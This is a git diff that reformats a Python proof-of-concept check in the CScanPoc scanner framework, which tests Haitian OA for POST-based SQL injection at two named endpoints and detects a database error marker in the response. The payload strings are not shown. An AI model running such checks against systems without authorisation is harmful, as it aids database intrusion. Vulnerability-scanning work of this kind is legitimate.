@@ -1,31 +1,32 @@
 # coding: utf-8
 
-from CScanPoc.thirdparty import requests,hackhttp
+from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 hh = hackhttp.hackhttp()
 
+
 class Vuln(ABVuln):
-    vuln_id = 'HaitianOA_0004' # 平台漏洞编号，留空
-    name = '海天OA系统存在SQL注入' # 漏洞名称
-    level = VulnLevel.HIGH # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    vuln_id = 'HaitianOA_0004'  # 平台漏洞编号，留空
+    name = '海天OA系统存在SQL注入'  # 漏洞名称
+    level = VulnLevel.HIGH  # 漏洞危害级别
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-02-12'  # 漏洞公布时间
     desc = '''
         海天OA系统存在多处POST型 SQL注入漏洞：
         /portal/content/content_1.asp
         /VO_EmailCaoGao.asp?action=search
-    ''' # 漏洞描述
-    ref = 'Unknown' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=083161
-    cnvd_id = 'Unknown' # cnvd漏洞编号
-    cve_id = 'Unknown' #cve编号
+    '''  # 漏洞描述
+    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=083161
+    cnvd_id = 'Unknown'  # cnvd漏洞编号
+    cve_id = 'Unknown'  # cve编号
     product = '海天OA'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
 
 class Poc(ABPoc):
-    poc_id = '1e0faec3-f252-4cd0-97ca-ce403097c553' # 平台 POC 编号，留空
+    poc_id = '1e0faec3-f252-4cd0-97ca-ce403097c553'  # 平台 POC 编号，留空
     author = '47bwy'  # POC编写者
-    create_date = '2018-06-01' # POC创建时间
+    create_date = '2018-06-01'  # POC创建时间
 
     def __init__(self):
         super(Poc, self).__init__(Vuln())
@@ -37,7 +38,7 @@ class Poc(ABPoc):
             arg = '{target}'.format(target=self.target)
 
             content_type = 'Content-Type: application/x-www-form-urlencoded'
-            #POST 型
+            # POST 型
             urls = [
                 arg + '/portal/content/content_1.asp',
                 arg + '/VO_EmailCaoGao.asp?action=search'
@@ -49,7 +50,8 @@ class Poc(ABPoc):
             for i in range(len(urls)):
                 url = urls[i]
                 data = datas[i]
-                code, head, res, err, _ = hh.http(url, post=data, header=content_type)
+                code, head, res, err, _ = hh.http(
+                    url, post=data, header=content_type)
                 if(code == 200 and 'WtFaBcMicrosoft SQL Server' in res):
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
